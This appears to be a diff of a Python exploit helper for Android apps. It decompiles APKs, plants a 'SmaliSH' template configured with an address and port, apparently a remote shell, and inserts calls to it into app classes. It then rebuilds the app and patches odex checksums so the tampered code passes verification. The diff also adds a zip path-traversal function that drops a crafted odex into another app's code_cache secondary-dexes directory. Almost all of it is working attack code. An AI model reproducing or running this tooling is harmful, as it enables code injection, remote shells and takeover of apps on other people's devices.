@@ -4,8 +4,7 @@ import subprocess
 import os
 import glob
 import tempfile
-import sys
-
+import zipfile
 import odexcrc
 
 mydir = os.path.dirname(os.path.realpath(__file__))
@@ -33,19 +32,16 @@ def apktool_d(apk, dir):
     subprocess.check_output(['apktool', 'd', apk, '-o', dir, '-f'])
 
 
-def apktool_dir_get_classes_dirs(dir):
+def apktool_find_hi_classes_no(dir):
     res = []
     fs = os.listdir(dir)
     for f in fs:
         if f.find('smali_classes') == 0:
             res += [f]
     res.sort()  # todo numeric_sort for smali_classes11
-    return res
+    return res.pop().replace('smali_classes', '')
 
 
-def get_dex_filename_from_smali_classes_dirname(dir):
-    n = re.findall('smali_classes(\d+)', dir)[0]
-    return 'classes' + n + '.dex'
 
 
 def plant_smalish(address, port, classes_dir):
@@ -56,7 +52,7 @@ def plant_smalish(address, port, classes_dir):
         template = f.read().decode('utf-8')
 
     template = template.replace('{SMALISH_ADDRES}', address)
-    template = template.replace('{SMALISH_PORT}', hex(port))
+    template = template.replace('{SMALISH_PORT}', hex(int(port)))
 
     dstpath = classes_dir + '/re/SmaliSH.smali'
     os.mkdir(os.path.dirname(dstpath))
@@ -68,6 +64,7 @@ def plant_smalish(address, port, classes_dir):
 def plant_smalish_calls(classes_dir, classes, ):
     print('plant_smalish_calls ', classes)
     for cls in classes:
+        print(cls)
         fs = glob.glob(classes_dir + '/**/%s.smali' % cls)
         if len(fs) != 1:
             raise Exception(fs)
@@ -100,7 +97,7 @@ def dexopt(dexfile, outOdexFile):
 def fix_crc(dex, odex):
     checksum = subprocess.check_output(['crc32', dex]).strip()
     print('fix_crc crc32 = ', checksum, odex)
-    mod_when = 0x210000 # this is probably checksum of bootclasspath
+    mod_when = 0x210000  # this is probably checksum of bootclasspath
     print('prev crc ', [hex(i) for i in odexcrc.get(odex)])
     odexcrc.set(odex, mod_when, int(checksum, 16))
     print('prev crc ', [hex(i) for i in odexcrc.get(odex)])
@@ -109,3 +106,12 @@ def fix_crc(dex, odex):
 def apktool_b(dir):
     print('apktool b')
     subprocess.check_output(['apktool', 'b'], cwd=dir)
+
+
+def zip_odex_traversal(odex, appid, n):
+    temp = tempfile.mktemp('.zip')
+    res = zipfile.ZipFile(temp, 'w', zipfile.ZIP_DEFLATED)
+    slide = '../../../../../../../../../../../../../../..'
+    res.write(odex, slide + '/data/data/%s/code_cache/secondary-dexes/%s-1.apk.classes%s.dex' % (appid, appid, n))
+    res.close()
+    return temp
